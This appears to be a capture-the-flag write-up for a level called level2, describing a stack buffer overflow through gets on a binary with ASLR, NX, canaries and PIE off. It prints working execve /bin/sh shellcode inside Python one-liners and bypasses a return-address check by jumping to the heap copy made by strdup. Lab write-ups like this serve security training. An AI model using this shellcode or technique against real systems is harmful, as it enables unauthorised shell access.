```
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level2/level2
```

For this one ltrace reveals another gets call

This time there is no uncalled function to help us

Wel'll perform a shellcode injection 
https://shell-storm.org/shellcode/files/shellcode-841.html

Injecting the shellcode is easy thanks to gets

Thanks to a pattern generator, we can see that the offset is 80, so our shellcode must stay below 80 bytes, with + 4 for the return address.

|        Buffer             |
|____________80_____________| 
| 21      | 59              | 4               |
| Payload | padding         | return address  |

We get the address of our buffer and append it

python -c 'print ("\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" + "\x90" * 59 + "\xdc\xf6\xff\xbf")' > /tmp/2

But the code uses a binary mask to detect such return point overrides, and it leads to an exit so no luck here

But later on there is a call to strdup of the input string, and this address does not match with the mask so we're good

The malloc always gives out address 0x804a008 so '\x08\xa0\x04\x08'

python -c 'print ("\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" + "\x90" * 59 + "\x08\xa0\x04\x08")' > /tmp/2